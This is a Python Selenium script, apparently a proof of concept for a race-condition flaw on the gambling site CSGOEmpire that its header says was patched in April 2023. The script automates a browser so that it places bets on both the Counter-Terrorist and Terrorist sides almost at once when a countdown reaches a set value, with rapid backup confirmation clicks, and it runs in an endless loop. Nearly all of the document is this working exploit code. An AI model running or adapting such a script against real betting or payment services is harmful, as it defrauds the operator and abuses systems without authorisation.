# Vulnerability discovered on CSGOEmpire (Race Condition) 13/04/2023 Patched.

import time
from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.options import Options

opts = Options()
opts.headless = False
opts.add_argument("--incognito")
browser = webdriver.Chrome(ChromeDriverManager().install(), chrome_options=opts)

browser.get('http://csgoempire.com')

# Set price for bets (Any Amount).
bet = 0.01

def backupClick():
    try:
        # Reconfirm fast enough.
        if browser.find_element_by_xpath('//*[@id="app"]/div[6]/div/div/div[2]/div[2]/button[1]'):
            browser.find_element_by_xpath('//*[@id="app"]/div[6]/div/div/div[2]/div[2]/button[1]').click()
            print("Backup Click")
    except:
        pass

def click():
    try:
        # Set price for bet.
        browser.find_element_by_xpath('//*[@id="page-scroll"]/div[1]/div[2]/div/div[4]/div/div[1]/input').send_keys(str(bet))

        # CT
        # Find bet and place at the same time. Use backup to double confirm fast enough.
        browser.find_element_by_xpath('//*[@id="page-scroll"]/div[1]/div[2]/div/div[5]/div[1]/button').click()
        browser.find_element_by_xpath('//*[@id="page-scroll"]/div[1]/div[2]/div/div[5]/div[3]/button').click()
        backupClick()

        # Display T time bet was placed.
        print("Counter-Terrorist: " + str(time.time()))
        print("Terrorist: " + str(time.time()))

        # T
        # Find bet and place at the same time. Use backup to double confirm fast enough.
        #browser.find_element_by_xpath('//*[@id="page-scroll"]/div[1]/div[2]/div/div[5]/div[3]/button').click()
        backupClick()

        # Display T time bet was placed.
        #print("Terrorist: " + str(time.time()))

        print("Click!")
        time.sleep(10)
        browser.refresh()
    except:
        time.sleep(5)

# Count down to when bets are placed.
def timer():
    try:
        # Get the element using its XPath expression
        value_element = browser.find_element_by_xpath(
            '//*[@id="page-scroll"]/div[1]/div[2]/div/div[2]/div[3]/div/div[2]')

        # Extract the text content of the element
        value = float(value_element.text.strip())

        # Check if the value is 4.20 because funny.
        if value == 4.20:
            click()

    except:
        pass

# Loop indefinitely.
while True:
    timer()
